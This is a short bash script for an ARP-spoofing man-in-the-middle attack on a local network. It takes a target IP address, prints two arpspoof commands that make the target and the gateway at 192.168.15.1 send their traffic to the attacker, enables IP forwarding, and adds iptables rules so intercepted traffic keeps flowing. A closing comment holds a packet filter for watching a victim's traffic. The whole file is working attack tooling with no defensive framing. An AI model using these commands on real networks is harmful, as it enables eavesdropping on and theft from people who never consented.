!/bin/bash
ip=$1
#echo $ip
echo "sudo arpspoof -i enp2s0 -t $ip 192.168.15.1" # tell $0 i'm gataway
echo "sudo arpspoof -i enp2s0 -t 192.168.15.1 $ip" # tell gataway i'm $0
sudo sysctl -w net.ipv4.ip_forward=1
sudo /etc/init.d/procps restart
sudo iptables -A FORWARD -i enp2s0 -j ACCEPT
sudo iptables -A FORWARD -o enp2s0 -j ACCEPT
#ip.dst == 192.168.2.23 and not tcp.port in {80 25} and ip.addr == 192.168.15.64
